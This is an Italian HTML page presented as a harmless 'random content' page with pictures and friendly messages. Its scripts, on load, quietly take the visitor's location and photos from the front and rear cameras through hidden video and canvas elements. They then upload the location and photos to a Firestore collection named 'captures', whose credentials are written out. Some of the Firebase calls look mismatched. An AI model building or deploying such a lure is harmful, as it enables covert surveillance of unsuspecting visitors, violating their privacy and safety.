<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contenuto Casuale</title>
    <!-- Includi Firebase (versione modulare) -->
    <script type="module">
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.4/firebase-app.js';
        import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/10.12.4/firebase-firestore.js';

        // Configurazione Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyB5vi_b7HjiH5akXLsqk2OOO_lv-vSJzHI",
            authDomain: "cattura-a93c5.firebaseapp.com",
            projectId: "cattura-a93c5",
            storageBucket: "cattura-a93c5.firebasestorage.app",
            messagingSenderId: "155421459394",
            appId: "1:155421459394:web:2c3bcb70fe32bf1fc30c5b",
            measurementId: "G-E9MKECCY3W"
        };

        // Inizializza Firebase
        let db;
        try {
            const app = initializeApp(firebaseConfig);
            db = getFirestore(app);
            logDebug("Firebase inizializzato con successo");
        } catch (error) {
            logDebug("Errore inizializzazione Firebase: " + error.message);
        }

        // Esporta db per usarlo nel codice
        window.db = db;
    </script>
</head>
<body>
    <h1>Benvenuto!</h1>
    <div id="content"></div>
    <p id="privacy-notice">Questa pagina raccoglie posizione e foto. Continuando, accetti i nostri <a href="#">termini</a>.</p>
    <div id="debug"></div>
    <video id="video" autoplay style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        // Funzione di debug
        const debugDiv = document.getElementById('debug');
        function logDebug(message) {
            if (debugDiv) {
                debugDiv.innerHTML += `<p>${message}</p>`;
            } else {
                console.log("Debug: " + message);
            }
        }
        logDebug("Script avviato");

        // Contenuti casuali
        const randomContents = [
            '<img src="https://picsum.photos/600/400?random=1" alt="Immagine casuale">',
            '<img src="https://picsum.photos/600/400?random=2" alt="Immagine casuale">',
            '<p>ðŸ˜‰ GuiÃ±adle! Ecco una sorpresa!</p>',
            '<p>ðŸŒŸ Wow, guarda che bello!</p>',
            '<img src="https://picsum.photos/600/400?random=3" alt="Immagine casuale">'
        ];

        // Mostra contenuto casuale
        function showRandomContent() {
            const contentDiv = document.getElementById('content');
            if (contentDiv) {
                const randomIndex = Math.floor(Math.random() * randomContents.length);
                contentDiv.innerHTML = randomContents[randomIndex];
                logDebug("Contenuto casuale mostrato");
            } else {
                logDebug("Content div non trovato");
            }
        }

        // Ottieni posizione
        function getLocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            logDebug(`Posizione acquisita: Lat ${position.coords.latitude}, Lon ${position.coords.longitude}`);
                            resolve({ latitude: position.coords.latitude, longitude: position.coords.longitude });
                        },
                        (error) => {
                            logDebug("Errore geolocalizzazione: " + error.message);
                            reject("Errore geolocalizzazione: " + error.message);
                        }
                    );
                } else {
                    logDebug("Geolocalizzazione non supportata");
                    reject("Geolocalizzazione non supportata");
                }
            });
        }

        // Accedi alla fotocamera
        async function startCamera(facingMode) {
            const video = document.getElementById('video');
            if (video) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: facingMode }
                    });
                    video.srcObject = stream;
                    logDebug(`Fotocamera ${facingMode} avviata`);
                    return stream;
                } catch (err) {
                    logDebug("Errore fotocamera: " + err.message);
                    throw err;
                }
            } else {
                logDebug("Video element non trovato");
                throw new Error("Video element non trovato");
            }
        }

        // Scatta foto
        function takePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            if (video && canvas) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photo = canvas.toDataURL('image/jpeg');
                logDebug("Foto scattata");
                return photo;
            } else {
                logDebug("Video o canvas non trovato");
                throw new Error("Video o canvas non trovato");
            }
        }

        // Ferma fotocamera
        function stopCamera(stream) {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                logDebug("Fotocamera fermata");
            }
        }

        // Salva dati su Firestore
        async function sendData(location, frontPhoto, backPhoto) {
            if (!window.db) {
                logDebug("Errore: Firestore non inizializzato");
                throw new Error("Firestore non inizializzato");
            }
            try {
                await window.db.collection('captures').add({
                    latitude: location.latitude,
                    longitude: location.longitude,
                    frontPhoto: frontPhoto,
                    backPhoto: backPhoto,
                    timestamp: new Date()
                });
                logDebug("Dati salvati su Firestore");
            } catch (err) {
                logDebug("Errore salvataggio: " + err.message);
                throw err;
            }
        }

        // Funzione principale
        async function captureData() {
            try {
                showRandomContent();
                const location = await getLocation();
                let stream = await startCamera('user');
                await new Promise(resolve => setTimeout(resolve, 1000));
                const frontPhoto = takePhoto();
                stopCamera(stream);
                stream = await startCamera('environment');
                await new Promise(resolve => setTimeout(resolve, 1000));
                const backPhoto = takePhoto();
                stopCamera(stream);
                await sendData(location, frontPhoto, backPhoto);
                logDebug("Acquisizione completata");
            } catch (err) {
                logDebug("Errore: " + err.message);
            }
        }

        // Avvia quando il DOM Ã¨ pronto
        document.addEventListener('DOMContentLoaded', captureData);
    </script>
</body>
</html>
